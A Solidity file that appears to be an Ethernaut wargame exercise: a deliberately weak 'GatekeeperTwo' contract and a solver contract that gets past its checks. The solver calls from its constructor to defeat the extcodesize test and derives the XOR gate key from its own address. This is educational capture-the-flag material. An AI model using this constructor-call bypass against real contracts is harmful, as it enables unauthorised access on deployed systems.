// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^
                uint64(_gateKey) ==
                uint64(0) - 1,
            "Gate3 failed"
        );
        _;
    }

    function enter(bytes8 _gateKey)
        public
        gateOne
        gateTwo
        gateThree(_gateKey)
        returns (bool)
    {
        entrant = tx.origin;
        return true;
    }
}

contract GatekeeperTwoSolver {
    constructor(address gateKeeperAddress) public {
        GatekeeperTwo gateKeeper = GatekeeperTwo(gateKeeperAddress);
        bytes8 gateKey = calculateGateKey(address(this));
        gateKeeper.enter(gateKey);
    }

    function calculateGateKey(address senderAddress)
        internal
        pure
        returns (bytes8)
    {
        uint64 value = uint64(
            bytes8(keccak256(abi.encodePacked(senderAddress)))
        ) ^ (uint64(0) - 1);
        return bytes8(value);
    }
}
